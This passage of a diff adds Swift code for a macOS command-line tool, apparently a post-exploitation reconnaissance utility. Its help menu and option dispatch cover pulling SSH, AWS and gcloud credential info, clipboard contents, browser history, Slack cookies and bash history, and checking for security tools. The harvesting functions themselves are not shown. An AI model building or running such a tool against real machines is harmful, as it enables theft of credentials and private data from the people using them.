+            print("\(cyan)-SystemInfo -->\(colorend) Pull back system info (wifi SSID info, open directory node info, internal IPs, ssh/aws/gcloud cred info, basic system info)")
+            print("\(cyan)-Clipboard --> \(colorend)Dump clipboard contents")
+            print("\(cyan)-RunningApps --> \(colorend)List all running apps")
+            print("\(cyan)-ListUsers --> \(colorend)List local user accounts")
+            print("\(cyan)-LaunchAgents --> \(colorend)List launch agents, launch daemons, and configuration profile files")
+            print("\(cyan)-BrowserHistory --> \(colorend)Attempt to pull Safari, Firefox, Chrome, and Quarantine history")
+            print("\(cyan)-SlackExtract --> \(colorend)Check if Slack is present and if so read cookie, downloads, and workspaces info")
+            print("\(cyan)-BhashHistory --> \(colorend)Read bash history content")
+            print("")
+            print("\(yellow)Usage:\(colorend)")
+            print("To run all options:  \(binname)")
+            print("To specify certain options:  \(binname) [option1] [option2] [option3]...")
+            print("")
+            exit(0)
+        }
+        else {
+            if argument.contains("-SecurityTools"){
+                SecCheck()
+            }
+            
+            if argument.contains("-SystemInfo"){
+                SystemInfo()
+            }
+            
+            if argument.contains("-Clipboard"){
+                Clipboard()
+            }
+            if argument.contains("-RunningApps"){
+                RunningApps()
+            }
+            if argument.contains("-ListUsers"){
+                ListUsers()
+            }
+            if argument.contains("-LaunchAgents"){
+                LaunchAgents()
+            }
+            if argument.contains("-BrowserHistory"){
+                BrowserHistory()
+            }
+            if argument.contains("-SlackExtract"){
+                SlackExtract()
+            }
+            if argument.contains("-BashHistory"){
+                BashHistory()
+            }
+            
+            
+        }
+        
+    }
+}
+
+
+
